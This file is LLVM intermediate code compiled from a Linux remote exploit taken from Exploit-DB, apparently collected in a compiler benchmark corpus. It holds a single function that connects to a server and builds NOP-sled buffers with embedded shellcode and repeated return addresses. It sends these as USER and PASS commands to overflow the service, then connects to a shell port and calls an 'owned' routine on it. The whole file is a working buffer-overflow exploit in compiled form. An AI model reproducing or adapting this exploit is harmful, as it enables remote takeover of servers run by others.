; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23413.c_ebol4.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23413.c_ebol4.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [44 x i8] c"\0A _(0x666)_  Error in connecting to server\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c" _(0x1)_  Connected (!)\0A\00", align 1
@shellcode_1 = common dso_local global i8* null, align 8
@shellcode_2 = common dso_local global i8* null, align 8
@fdsocket = common dso_local global i32 0, align 4
@debug = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [29 x i8] c"\0A <debug> server resp. : %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [38 x i8] c" _(0x2)_  Sending USER (shellcode_1)\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c" <debug> [w8ing ...] run gdb then press [ENTER]\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c" _(0x3)_  Sending PASS (shellcode_2)\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"PASS %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c" <debug> server resp. : %s\0A\00", align 1
@SHELL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @ebol4(i8* %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [1024 x i8], align 16
  %12 = alloca [1024 x i8], align 16
  %13 = alloca [92 x i8], align 16
  %14 = alloca [101 x i8], align 16
  %15 = alloca i32*, align 8
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %16 = bitcast [1024 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %16, i8 0, i64 1024, i1 false)
  %17 = bitcast [1024 x i8]* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %17, i8 0, i64 1024, i1 false)
  %18 = getelementptr inbounds [101 x i8], [101 x i8]* %14, i64 0, i64 0
  %19 = load i32, i32* %9, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %15, align 8
  %23 = load i8*, i8** %6, align 8
  %24 = load i32, i32* %7, align 4
  %25 = call i64 @connection(i8* %23, i32 %24)
  %26 = icmp ne i64 %25, 0
  br i1 %26, label %27, label %29

27:                                               ; preds = %4
  %28 = call i32 @warning(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  br label %32

29:                                               ; preds = %4
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  br label %32

32:                                               ; preds = %29, %27
  %33 = getelementptr inbounds [92 x i8], [92 x i8]* %13, i64 0, i64 0
  %34 = call i32 @memset(i8* %33, i32 144, i32 92)
  %35 = getelementptr inbounds [92 x i8], [92 x i8]* %13, i64 0, i64 0
  %36 = load i8*, i8** @shellcode_1, align 8
  %37 = load i8*, i8** @shellcode_1, align 8
  %38 = call i32 @strlen(i8* %37)
  %39 = call i32 @memcpy(i8* %35, i8* %36, i32 %38)
  %40 = getelementptr inbounds [101 x i8], [101 x i8]* %14, i64 0, i64 0
  %41 = call i32 @memset(i8* %40, i32 144, i32 101)
  store i32 0, i32* %10, align 4
  br label %42

42:                                               ; preds = %46, %32
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 15
  br i1 %44, label %45, label %52

45:                                               ; preds = %42
  br label %46

46:                                               ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 4
  store i32 %48, i32* %10, align 4
  %49 = load i32, i32* %8, align 4
  %50 = load i32*, i32** %15, align 8
  %51 = getelementptr inbounds i32, i32* %50, i32 1
  store i32* %51, i32** %15, align 8
  store i32 %49, i32* %50, align 4
  br label %42

52:                                               ; preds = %42
  %53 = getelementptr inbounds [101 x i8], [101 x i8]* %14, i64 0, i64 0
  %54 = getelementptr inbounds i8, i8* %53, i64 15
  %55 = getelementptr inbounds i8, i8* %54, i64 12
  %56 = load i8*, i8** @shellcode_2, align 8
  %57 = load i8*, i8** @shellcode_2, align 8
  %58 = call i32 @strlen(i8* %57)
  %59 = call i32 @memcpy(i8* %55, i8* %56, i32 %58)
  %60 = load i32, i32* @fdsocket, align 4
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %62 = call i32 @recv(i32 %60, i8* %61, i32 1024, i32 0)
  %63 = load i64, i64* @debug, align 8
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %69

65:                                               ; preds = %52
  %66 = load i32, i32* @stdout, align 4
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %68 = call i32 (i32, i8*, ...) @fprintf(i32 %66, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %67)
  br label %69

69:                                               ; preds = %65, %52
  %70 = load i32, i32* @stdout, align 4
  %71 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  %72 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %73 = getelementptr inbounds [92 x i8], [92 x i8]* %13, i64 0, i64 0
  %74 = call i32 @sprintf(i8* %72, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %73)
  %75 = load i32, i32* @fdsocket, align 4
  %76 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @write(i32 %75, i8* %76, i32 %78)
  %80 = load i32, i32* @fdsocket, align 4
  %81 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %82 = call i32 @recv(i32 %80, i8* %81, i32 1024, i32 0)
  %83 = load i64, i64* @debug, align 8
  %84 = icmp ne i64 %83, 0
  br i1 %84, label %85, label %89

85:                                               ; preds = %69
  %86 = load i32, i32* @stdout, align 4
  %87 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0))
  %88 = call i32 (...) @getchar()
  br label %89

89:                                               ; preds = %85, %69
  %90 = load i32, i32* @stdout, align 4
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %92 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %93 = getelementptr inbounds [101 x i8], [101 x i8]* %14, i64 0, i64 0
  %94 = call i32 @sprintf(i8* %92, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i8* %93)
  %95 = load i32, i32* @fdsocket, align 4
  %96 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %97 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %98 = call i32 @strlen(i8* %97)
  %99 = call i32 @write(i32 %95, i8* %96, i32 %98)
  %100 = load i32, i32* @fdsocket, align 4
  %101 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %102 = call i32 @recv(i32 %100, i8* %101, i32 1024, i32 0)
  %103 = load i64, i64* @debug, align 8
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %109

105:                                              ; preds = %89
  %106 = load i32, i32* @stdout, align 4
  %107 = getelementptr inbounds [1024 x i8], [1024 x i8]* %12, i64 0, i64 0
  %108 = call i32 (i32, i8*, ...) @fprintf(i32 %106, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0), i8* %107)
  br label %109

109:                                              ; preds = %105, %89
  %110 = load i32, i32* @fdsocket, align 4
  %111 = call i32 @close(i32 %110)
  %112 = load i8*, i8** %6, align 8
  %113 = load i32, i32* @SHELL, align 4
  %114 = call i64 @connection(i8* %112, i32 %113)
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %119, label %116

116:                                              ; preds = %109
  %117 = load i32, i32* @fdsocket, align 4
  %118 = call i32 @owned(i32 %117)
  br label %120

119:                                              ; preds = %109
  store i32 1638, i32* %5, align 4
  br label %121

120:                                              ; preds = %116
  store i32 819, i32* %5, align 4
  br label %121

121:                                              ; preds = %120, %119
  %122 = load i32, i32* %5, align 4
  ret i32 %122
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i64 @connection(i8*, i32) #2

declare dso_local i32 @warning(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @getchar(...) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @owned(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
